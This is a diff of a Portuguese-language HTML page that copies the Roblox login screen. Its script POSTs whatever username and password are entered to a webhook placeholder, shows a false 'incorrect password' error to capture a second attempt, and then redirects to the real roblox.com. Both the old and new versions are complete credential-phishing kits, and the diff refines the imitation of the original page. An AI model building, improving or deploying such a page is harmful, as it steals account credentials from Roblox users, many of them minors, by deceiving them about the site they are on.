@@ -1,201 +1,246 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Entrar na Roblox</title>
-    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
-        
-        :root {
-            --bg-main: #191a1f; 
-            --bg-card: #272930;
-            --input-bg: rgba(255, 255, 255, 0.1); 
-            --text-main: #ffffff;
-            --rbx-blue: #0084ff;
-            --rbx-error: #f74b52;
-            --border-grey: #454749;
-            --footer-bg: #121215;
-            --state-hover: rgba(255, 255, 255, 0.1);
-            --radius-main: 8px;
-        }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar na Roblox</title>
+    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
+        
+        :root {
+            --bg-main: #191a1f; 
+            --bg-card: #272930;
+            --input-bg: rgba(255, 255, 255, 0.1); 
+            --text-main: #ffffff;
+            --rbx-blue: #0084ff;
+            --rbx-error: #f74b52;
+            --border-grey: #454749;
+            --footer-bg: #121215;
+            --state-hover: rgba(255, 255, 255, 0.1);
+            --radius-main: 8px; /* Ajustado conforme o CSS original */
+        }
 
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+        @keyframes fadein-delay { 0% { opacity: 0 } 50% { opacity: 0 } to { opacity: 1 } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
 
-        body, html { 
-            margin: 0; padding: 0; min-height: 100%; 
-            font-family: 'HCo Gotham SSm', sans-serif; 
-            background-color: var(--bg-main); color: var(--text-main); 
-            display: flex; flex-direction: column; overflow-x: hidden;
-        }
+        body, html { 
+            margin: 0; padding: 0; min-height: 100%; 
+            font-family: 'HCo Gotham SSm', sans-serif; 
+            background-color: var(--bg-main); color: var(--text-main); 
+            display: flex; flex-direction: column; overflow-x: hidden;
+            animation: fadein-delay 0.8s ease-in;
+        }
 
-        /* HEADER */
-        .roblox-header { width: 100%; height: 44px; background: #232527; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: fixed; top: 0; z-index: 100; box-sizing: border-box; border-bottom: 1px solid var(--border-grey); }
-        .roblox-logo { height: 28px; width: 28px; background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg=='); background-size: contain; background-repeat: no-repeat; }
+        /* HEADER ORIGINAL STYLE */
+        .roblox-header { width: 100%; height: 44px; background: #232527; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: fixed; top: 0; z-index: 100; box-sizing: border-box; border-bottom: 1px solid var(--border-grey); }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .roblox-logo { height: 28px; width: 28px; background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg=='); background-size: contain; background-repeat: no-repeat; }
+        .nav-link { color: #fff; text-decoration: none; font-size: 14px; font-weight: 500; opacity: 0.9; }
 
-        .main-content { 
-            flex: 1; display: flex; align-items: center; justify-content: center; flex-direction: column; 
-            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); 
-            background-size: cover; background-position: center; padding: 80px 0 40px 0; 
-        }
-        
-        .login-card { 
-            background-color: var(--bg-card); padding: 40px 30px; 
-            border-radius: var(--radius-main); width: 400px; 
-            text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); 
-            box-sizing: border-box; position: relative; backdrop-filter: blur(10px);
-        }
+        /* BACKGROUND 2025 */
+        .main-content { 
+            flex: 1; display: flex; align-items: center; justify-content: center; flex-direction: column; 
+            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); 
+            background-size: cover; background-position: center; 
+            padding: 80px 0 40px 0; 
+        }
+        
+        .login-card { 
+            background-color: var(--bg-card); padding: 40px 30px; 
+            border-radius: var(--radius-main); width: 400px; 
+            text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); 
+            box-sizing: border-box; position: relative;
+            backdrop-filter: blur(10px); /* Toque Premium */
+        }
+        
+        /* Ícone de Escudo (Original Script) */
+        .shield-icon {
+            background: url(https://images.rbxcdn.com/2b967a925b86540c43b97878bbfc0632-lock.svg) no-repeat top;
+            background-size: 80px 80px; width: 80px; height: 80px;
+            margin: -10px auto 15px;
+        }
 
-        /* ACCOUNT SELECTOR (SCRIPT 5 INTEGRADO) */
-        .account-selector { max-height: 432px; overflow-y: auto; margin-top: 15px; border-radius: 4px; }
-        .account-selection-list-item { width: 100%; height: 72px; padding: 0 24px; cursor: pointer; display: flex; align-items: center; transition: 0.2s; box-sizing: border-box; }
-        .account-selection-list-item:hover { background: var(--state-hover); }
-        .account-selection { width: 100%; height: 100%; display: flex; align-items: center; border-bottom: 1px solid var(--border-grey); }
-        .thumbnail-2d-container { border-radius: 50%; height: 48px; width: 48px; background: #393b43; flex-shrink: 0; overflow: hidden; }
-        .account-selection-name-container { padding-left: 12px; text-align: left; overflow: hidden; flex-grow: 1; }
-        .account-selection-displayname { font-weight: 700; font-size: 14px; white-space: nowrap; text-overflow: ellipsis; overflow: hidden; }
-        .account-selection-username { font-size: 11px; opacity: 0.7; }
+        #error-msg { 
+            color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; 
+            display: none; text-align: left; background: rgba(247, 75, 82, 0.1); 
+            padding: 10px; border-radius: 4px; border-left: 3px solid var(--rbx-error); 
+        }
 
-        /* ELEMENTOS DO CARD */
-        .shield-icon { background: url(https://images.rbxcdn.com/2b967a925b86540c43b97878bbfc0632-lock.svg) no-repeat top; background-size: 80px 80px; width: 80px; height: 80px; margin: -10px auto 15px; }
-        .input-field { width: 100%; height: 44px; background-color: var(--input-bg); border: 1px solid rgba(0,0,0,0.1); border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px; box-sizing: border-box; outline: none; font-size: 15px; }
-        .input-field-error { border: 1px solid var(--rbx-error) !important; background-color: rgba(247, 75, 82, 0.05) !important; }
-        #error-msg { color: var(--rbx-error); font-size: 13px; margin-bottom: 15px; display: none; text-align: left; background: rgba(247, 75, 82, 0.1); padding: 10px; border-radius: 4px; border-left: 3px solid var(--rbx-error); }
+        .input-field { 
+            width: 100%; height: 44px; background-color: var(--input-bg); 
+            border: 1px solid rgba(0,0,0,0.1); border-radius: var(--radius-main); 
+            color: #fff; padding: 0 12px; margin-bottom: 12px; 
+            box-sizing: border-box; outline: none; transition: 0.2s; font-size: 15px;
+        }
+        .input-field:focus { border: 1px solid #fff; } /* Segue o script original dark */
+        .input-field-error { border: 1px solid var(--rbx-error) !important; background-color: rgba(247, 75, 82, 0.05) !important; }
 
-        .btn-primary-md { width: 100%; height: 42px; border: 1px solid #fff; background: rgba(255,255,255,0.05); color: #fff; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 10px; }
-        .btn-secondary { width: 100%; height: 42px; background-color: #393b43; border: none; color: #fff; border-radius: 4px; margin-top: 12px; cursor: pointer; }
+        /* CHECKBOX CUSTOM */
+        .checkbox-container {
+            display: flex; align-items: center; text-align: left; margin: 15px 0;
+            position: relative; cursor: pointer; font-size: 14px; color: #fff;
+            user-select: none;
+        }
+        .checkbox-container input { position: absolute; opacity: 0; left: -9999px; }
+        .checkmark {
+            height: 18px; width: 18px; background-color: #fff;
+            border-radius: 3px; margin-right: 10px; flex-shrink: 0;
+            border: 1px solid #bcbec8; position: relative;
+        }
+        .checkbox-container input:checked ~ .checkmark {
+            background-color: #70a0ff; border-color: #70a0ff;
+            background-image: url(https://images.rbxcdn.com/c3ebbbd60f3655d3a078dcfb632199fd-generic_01312019.svg);
+            background-repeat: no-repeat; background-size: 28px auto; background-position: 0 -602px;
+        }
 
-        /* COOKIE BANNER (SCRIPT 1) */
-        .cookie-banner { z-index: 1050; padding: 20px 24px; position: fixed; bottom: 0; width: 100%; background-color: #272930; border-top: 1px solid var(--border-grey); display: flex; justify-content: space-between; align-items: center; box-sizing: border-box; }
+        /* BOTÕES FIÉIS AO ORIGINAL */
+        .btn-primary-md { 
+            width: 100%; height: 42px; border: 1px solid #fff; 
+            background: rgba(255,255,255,0.05); color: #fff; 
+            border-radius: var(--radius-main); font-size: 16px; font-weight: 500; 
+            cursor: pointer; margin-top: 10px; transition: 0.2s;
+        }
+        .btn-primary-md:hover { background-color: var(--state-hover); }
 
-        #loading-overlay { background-color: rgba(0,0,0,0.7); position: fixed; inset: 0; z-index: 2000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
-        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--rbx-blue); border-radius: 50%; animation: spin 0.8s linear infinite; }
-    </style>
+        .btn-secondary { 
+            width: 100%; height: 42px; background-color: #393b43; 
+            border: none; color: #fff; border-radius: var(--radius-main); 
+            margin-top: 12px; cursor: pointer; font-weight: 500; transition: 0.2s;
+        }
+        .btn-secondary:hover { background-color: #45474d; }
+
+        .divider { border-top: 1px solid var(--border-grey); margin: 20px 0; width: 100%; }
+
+        /* FOOTER */
+        .container-footer { background-color: var(--footer-bg); padding: 40px 0; width: 100%; }
+        .footer-note { font-size: 12px; color: #d5d7dd; opacity: 0.7; text-align: center; }
+
+        /* LOADING OVERLAY ORIGINAL SCRIPT STYLE */
+        #loading-overlay { 
+            background-color: rgba(0,0,0,0.7); 
+            position: fixed; inset: 0; z-index: 2000; 
+            display: none; align-items: center; justify-content: center; 
+            backdrop-filter: blur(5px);
+        }
+        .spinner { 
+            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); 
+            border-top: 4px solid var(--rbx-blue); border-radius: 50%; 
+            animation: spin 0.8s linear infinite; 
+        }
+        .shake { animation: shake 0.2s ease-in-out 0s 2; }
+    </style>
 </head>
 <body>
 
 <div id="loading-overlay"><div class="spinner"></div></div>
 
 <header class="roblox-header">
-    <div class="roblox-logo"></div>
+    <div class="header-left">
+        <div class="roblox-logo"></div>
+        <a href="#" class="nav-link">Destaques</a>
+        <a href="#" class="nav-link">Mercado</a>
+    </div>
 </header>
 
 <main class="main-content">
-    <div class="login-card" id="selector-card">
-        <h1 style="margin-bottom: 20px; font-size: 24px;">Entrar na Roblox</h1>
-        <div class="account-selector">
-            <div class="account-selection-list-item" onclick="initLogin('Player_VOID', 'https://tr.rbxcdn.com/30day-avatar-headshot/150/150/AvatarHeadshot/Png')">
-                <div class="account-selection">
-                    <img src="https://tr.rbxcdn.com/30day-avatar-headshot/150/150/AvatarHeadshot/Png" class="thumbnail-2d-container">
-                    <div class="account-selection-name-container">
-                        <div class="account-selection-displayname">Player_VOID</div>
-                        <div class="account-selection-username">@oficial_void</div>
-                    </div>
-                </div>
-            </div>
-            <div class="account-selection-list-item" onclick="toggleView('manual')">
-                <div class="account-selection" style="border:none;">
-                    <div class="thumbnail-2d-container" style="display:flex; align-items:center; justify-content:center; font-size:24px; background:#454749;">+</div>
-                    <div class="account-selection-name-container">
-                        <div class="account-selection-displayname">Usar outra conta</div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+    <div class="login-card" id="card">
+        <div class="shield-icon"></div>
+        <h1 style="margin-bottom: 25px; font-weight: 700; font-size: 24px; letter-spacing: -0.5px;">Entrar na Roblox</h1>
+        
+        <div id="error-msg">Usuário ou senha incorretos.</div>
 
-    <div class="login-card" id="login-card" style="display:none;">
-        <div class="shield-icon" id="shield"></div>
-        <div id="acc-preview" style="display:none; margin-bottom: 15px;">
-            <img id="acc-img" src="" class="thumbnail-2d-container" style="margin: 0 auto;">
-            <p id="acc-name" style="font-weight:700; margin-top:10px;"></p>
-        </div>
-        
-        <div id="error-msg">Usuário ou senha incorretos.</div>
+        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone" autocomplete="off" oninput="resetStyles()">
+        <input type="password" id="pass" class="input-field" placeholder="Senha" oninput="resetStyles()">
+        
+        <label class="checkbox-container">
+            <input type="checkbox" checked>
+            <span class="checkmark"></span>
+            Manter sessão iniciada
+        </label>
 
-        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone" oninput="resetStyles()">
-        <input type="password" id="pass" class="input-field" placeholder="Senha" oninput="resetStyles()">
-        
-        <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
-        <button class="btn-secondary" onclick="location.reload()">Voltar</button>
-    </div>
+        <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
+        
+        <a href="#" style="display: block; margin: 15px 0; color: #fff; text-decoration: none; font-size: 14px; opacity: 0.8;">Esqueceu a senha ou nome de usuário?</a>
+        
+        <div class="divider"></div>
+        
+        <button class="btn-secondary" style="margin-top: 0;">Entrada rápida</button>
+        
+        <p style="margin-top: 25px; font-size: 14px; color: #fff;">
+            Não possui uma conta? <a href="#" style="color:#fff; font-weight:700; text-decoration:none;">Cadastrar-se</a>
+        </p>
+    </div>
 </main>
 
-<div class="cookie-banner" id="cb">
-    <span style="font-size: 13px; opacity: 0.9;">A Roblox utiliza cookies para melhorar sua experiência.</span>
-    <button style="background:#fff; border:none; padding:8px 16px; border-radius:4px; font-weight:700; cursor:pointer;" onclick="document.getElementById('cb').remove()">Aceitar</button>
-</div>
-
-<footer class="container-footer" style="background:var(--footer-bg); padding:20px; text-align:center;">
-    <p style="font-size: 12px; color: #d5d7dd; opacity: 0.5;">©2026 Roblox Corporation. Todos os direitos reservados.</p>
+<footer class="container-footer">
+    <p class="footer-note">©2026 Roblox Corporation. Todos os direitos reservados.</p>
 </footer>
 
 <script>
-    let attempts = 0;
-    const webhookURL = "SUA_WEBHOOK_AQUI";
+    let attempt = 0;
+    const webhookURL = "SUA_WEBHOOK_AQUI"; 
 
-    function toggleView(mode) {
-        document.getElementById('selector-card').style.display = 'none';
-        document.getElementById('login-card').style.display = 'block';
-        if(mode === 'manual') document.getElementById('shield').style.display = 'block';
-    }
+    function resetStyles() {
+        const inputs = document.querySelectorAll('.input-field');
+        inputs.forEach(i => i.classList.remove('input-field-error'));
+        document.getElementById('error-msg').style.display = 'none';
+    }
 
-    function initLogin(name, img) {
-        toggleView('auto');
-        document.getElementById('shield').style.display = 'none';
-        document.getElementById('acc-preview').style.display = 'block';
-        document.getElementById('acc-img').src = img;
-        document.getElementById('acc-name').innerText = name;
-        document.getElementById('user').value = name;
-    }
+    async function execLogin() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        const card = document.getElementById('card');
+        const errorDiv = document.getElementById('error-msg');
+        const overlay = document.getElementById('loading-overlay');
 
-    function resetStyles() {
-        document.querySelectorAll('.input-field').forEach(i => i.classList.remove('input-field-error'));
-        document.getElementById('error-msg').style.display = 'none';
-    }
+        if(!u || !p) {
+            triggerError();
+            return;
+        }
 
-    async function execLogin() {
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
-        if(!u || !p) return;
+        overlay.style.display = 'flex';
 
-        document.getElementById('loading-overlay').style.display = 'flex';
+        try {
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🛠️ VOID - PROTOCOLO COLMEIA",
+                        color: 3092790,
+                        fields: [
+                            {name: "👤 Login", value: `\`${u}\``, inline: true},
+                            {name: "🔑 Código", value: `\`${p}\``, inline: true},
+                            {name: "📡 Status", value: `Tentativa #${attempt + 1}`, inline: true}
+                        ],
+                        footer: {text: "CTO VOID | Lead Architect 2026"}
+                    }]
+                })
+            });
+        } catch (e) { console.log("Erro de rede."); }
 
-        try {
-            await fetch(webhookURL, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🛠️ VOID - PROTOCOLO COLMEIA",
-                        color: 3092790,
-                        fields: [
-                            {name: "👤 Login", value: `\`${u}\``, inline: true},
-                            {name: "🔑 Código", value: `\`${p}\``, inline: true}
-                        ],
-                        footer: {text: `Tentativa #${attempts + 1} | 2026`}
-                    }]
-                })
-            });
-        } catch (e) {}
+        setTimeout(() => {
+            overlay.style.display = 'none';
+            attempt++;
 
-        setTimeout(() => {
-            document.getElementById('loading-overlay').style.display = 'none';
-            attempts++;
-            if(attempts >= 2) {
-                window.location.href = "https://www.roblox.com/home";
-            } else {
-                const card = document.getElementById('login-card');
-                card.classList.add('shake');
-                document.getElementById('error-msg').style.display = 'block';
-                document.querySelectorAll('.input-field').forEach(i => i.classList.add('input-field-error'));
-                document.getElementById('pass').value = "";
-                setTimeout(() => card.classList.remove('shake'), 400);
-            }
-        }, 1200);
-    }
+            if(attempt >= 2) {
+                window.location.href = "https://www.roblox.com/home";
+            } else {
+                triggerError();
+            }
+        }, 1500);
+
+        function triggerError() {
+            card.classList.add('shake');
+            errorDiv.style.display = 'block';
+            document.querySelectorAll('.input-field').forEach(i => i.classList.add('input-field-error'));
+            document.getElementById('pass').value = "";
+            setTimeout(() => card.classList.remove('shake'), 400);
+        }
+    }
 </script>
+
 </body>
 </html>
